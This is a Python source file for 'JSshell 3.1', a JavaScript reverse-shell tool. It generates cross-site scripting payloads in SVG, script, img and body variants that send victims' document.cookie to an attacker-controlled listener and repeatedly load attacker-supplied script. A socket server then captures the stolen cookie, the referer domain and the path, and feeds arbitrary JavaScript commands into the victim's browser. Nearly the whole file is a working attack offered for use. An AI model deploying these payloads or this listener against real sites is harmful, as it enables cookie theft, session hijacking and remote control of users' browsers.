#!/usr/bin/env python3
import socket
import sys
from requests import get
import argparse


red = '\033[1;31m'
white = '\033[1;m'
blue = '\033[1;34m'
if sys.platform == 'win32':
    white = red = blue = ''

if sys.version_info < (3, 0):
    input = raw_input

banner = '''%s    __
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v3.1
''' % red
hp = '''JSshell uses javascript code as shell commands. Also supports some commands:
help                  This help
domain                The source domain
pwd                   The source path
cookie                The user cookie
snippet               Write a snippet of code
exit, quit            Exit the JS shell'''


parser = argparse.ArgumentParser(description='JSshell 3.1: javascript reverse shell')
parser.add_argument('-g', help='generate JS reverse shell payloads', dest='gene', action='store_true')
parser.add_argument('-p', help='port number (default: 4848)', dest='port', default=4848)
parser.add_argument('-s', help='source address (or hostname)', dest='host', default='')
parser.add_argument('-t', help='target to be used in payloads, default: [host]:[port] from -s and -p', dest='target', default=str())
parser.add_argument('-c', help='command to execute after get the shell', dest='command', default=str())
parser.add_argument('-w', help='timeout for shell connection', dest='secs', type=float, default=0)
parser.add_argument('-q', help='quiet mode', dest='quiet', action='store_true')


args = parser.parse_args()

host = args.host
target = args.target
gene = args.gene
cmd = args.command
secs = args.secs
    
try:
    port = int(format(args.port))
    if not 0 <= port <= 65535:
        print('Invalid port: %s' % port)
        quit
except:
    print('Invalid port: %s' % port)
    quit
    
if target:
    source = target
else:
    if not host:
        host = get('https://api.ipify.org').text

    source = "//{0}:{1}".format(host, port)

if args.quiet:
    uprint = str
else:
    uprint = print
    
payload = '''
    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}?".concat(document.cookie)}},1010)>
    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}/?".concat(document.cookie)}},1010)</script>
    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}/?".concat(document.cookie)}},1010)>
    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}/?".concat(document.cookie)}},1010)></body>
    '''.format(source)

        
form = b'''HTTP/1.1 200 OK
Content-Type: application/javascript
Connection: close

'''


def shell():
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        if secs != 0:
            s.settimeout(secs)
        buffer = input('%s>>>%s ' % (blue, white))
        if buffer == 'exit' or buffer == 'quit':
            break
        try:
            if buffer[-1] in ['{', '(', '[']:
                openchar = buffer[-1]
                while 1:
                    func = input(' ' * 10)
                    buffer += '\n' + func
                    try:
                        if func[-1] == openchar:
                            break
                    except:
                        pass
        except:
            pass

        s.bind(('0.0.0.0', port))
        s.listen(0)

        try:
            c, a = s.accept()
            data = c.recv(2048)

            if buffer == 'help':
                print(hp)
            elif buffer == 'snippet':
                print('Use CTRL+D to finish the snippet')
                print()

                buffer = sys.stdin.read()
            elif buffer == 'domain':
                try:
                    print(domain)
                except:
                    print('Could not get the source domain because the referer has been disabled')
            elif buffer == 'pwd':
                try:
                    print(pth)
                except:
                    print('Could not get the source path because the referer has been disabled')
            elif buffer == 'cookie':
                try:
                    print(cookie)
                except:
                    print('Could not get the cookie because there is no cookie or because of other reasons')

            c.send(form + buffer.encode())
            c.shutdown(socket.SHUT_RDWR)
            c.close()
            s.close()
        except KeyboardInterrupt:
            if sys.platform == 'win32':
                print('\nControl-C')
            s.close()
            break
        except Exception as msg:
            s.close()
            break
        
def main():
    global cookie
    global domain
    global pth
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s.bind(('0.0.0.0', port))
    except socket.error as msg:
        print("Can't grab 0.0.0.0:%s with bind: %s" % (port, msg))
        quit()

    uprint(banner)

    if gene:
        uprint('%sPayloads:  %s' % (white, payload))
    
    print('%sListening on [any] %s for incoming JS shell ...' % (white, port))

    s.listen(2)

    try:
        c, addr = s.accept()
        resp = c.recv(1024).decode()
    except KeyboardInterrupt:
        if sys.platform == 'win32':
                print('\nControl-C')
        exit()
    except:
        s.close()
        main()

    if 'Accept' in resp and 'HTTP' in resp:
        print('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
        if '?' in resp.split('\n')[0]:
            cookie = resp.split('\n')[0].split(' ')[1].split('?')[1]
        for line in resp.split('\n'):
            if 'referer' in line.lower():
                referer = line[9:]
                domain = referer.split('//')[1]
                pth = '/'.join(referer.split('/')[3:])
                if pth in ['', '\r']:
                    pth = '/'
        if len(cmd):
            c.send(form + cmd.encode())
            print('%s>>>%s %s' % (blue, white, cmd))

        c.shutdown(socket.SHUT_RDWR)
        c.close()
        s.close()
        shell()

    else:
        s.close()
        main()


main()
